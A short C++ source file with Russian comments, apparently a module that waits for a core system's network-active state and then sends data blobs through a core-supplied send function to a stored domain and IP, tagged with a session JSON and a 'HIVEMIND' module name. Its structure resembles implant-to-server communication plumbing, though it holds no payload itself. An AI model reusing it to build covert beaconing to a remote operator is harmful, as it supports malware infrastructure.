#include "core_interact.hpp"
#include "utils.h"

// ожидает dwTimeout времени пока статус модульной системы станет MODULESYSTEM_NETWORK_ACTIVE и копирует контекст для последующего чтения
// если dwTimeout задан в INFINITE константу, то ожидает вечность
static BOOL WaitForActiveState(DWORD dwTimeout, module_data::msys_context *ctx_copy)
{
	if ((ctx_copy == nullptr) || (global_data::ctx == nullptr))
		return FALSE;

	BOOL bRet = FALSE;
	
	module_data::_msystem_status status = module_data::msystem_status_t::MODULESYSTEM_HALT;

	// время начала цикла, нужно чтобы отсчитывать таймаут
	DWORD dwWaitStartTime = GetTickCount();
	for (;;)
	{
		// прочитаем контекст внутри критической секции, так будет потокобезопасно
		EnterCriticalSection(&global_data::ctx->critSect);

		status = global_data::ctx->lock_status;
		// если статус - активный, то скопируем контекст для дальнейшего безопасного чтения
		if (status == module_data::msystem_status_t::MODULESYSTEM_NETWORK_ACTIVE)
			_RtlCopyMemory((LPBYTE)ctx_copy, (LPBYTE)global_data::ctx, sizeof(module_data::msys_context));

		LeaveCriticalSection(&global_data::ctx->critSect);

		if (status == module_data::msystem_status_t::MODULESYSTEM_NETWORK_ACTIVE)
			break;

		// если таймаут установлен, то проверим прошло ли уже нужное время и тогда выйдем
		if ((dwTimeout != INFINITE) && ((GetTickCount() - dwWaitStartTime) >= dwTimeout))
			break;

#ifdef _DEBUG
		WriteLog(L"[WaitForActiveState] waiting for active state...");
#endif
		
		Sleep(1000);
	}

	return (status == module_data::msystem_status_t::MODULESYSTEM_NETWORK_ACTIVE);
}

BOOL SendData(blob * pblData, blob * pblOutputResponse)
{
	if ((pblData == nullptr) || (pblData->lpBuffer == nullptr) || (pblData->dwBufSize == 0))
		return FALSE;

	BOOL bRet = FALSE;

	blob TempData;
	// копия контекста нужна, чтобы мы могли читать из него без критических секций
	module_data::msys_context *ctx_copy = nullptr;
	RtlSecureZeroMemory(&TempData, sizeof(TempData));
	do
	{
		ctx_copy = new module_data::msys_context;
		if (ctx_copy == nullptr)
			break;

		if (!WaitForActiveState(INFINITE, ctx_copy))
		{
#ifdef _DEBUG
			WriteLog(L"[SendData] waiting timeout of WaitForActiveState reached, leaving SendData function...");
#endif
			break;
		}

		// если pblOutputResponde задан, то ответ запишем в него, иначе он не требуется и запишем его в TempData, после чего освободим
		blob *pblResult = pblOutputResponse;
		if (pblResult == nullptr)
			pblResult = &TempData;

		if (ctx_copy->send != nullptr)
		{
			bRet = (ERROR_SUCCESS == ctx_copy->send(ctx_copy->lock_wchDomain,	ctx_copy->lock_wchIP, // куда стучать
					pblData->lpBuffer, pblData->dwBufSize, // данные для отправки
					&pblResult->lpBuffer, &pblResult->dwBufSize, // результат
					ctx_copy->lock_pwchSessionJson, HIVEMIND_MODULE_DWORD_NAME));
		}

	} while (FALSE);

	if (ctx_copy != nullptr)
	{
		delete ctx_copy;
		ctx_copy = nullptr;
	}

	if (TempData.lpBuffer != nullptr)
	{
		RtlSecureZeroMemory(TempData.lpBuffer, TempData.dwBufSize);
		VirtualFree(TempData.lpBuffer, 0, MEM_RELEASE);
		RtlSecureZeroMemory(&TempData, sizeof(TempData));
	}

	return bRet;
}
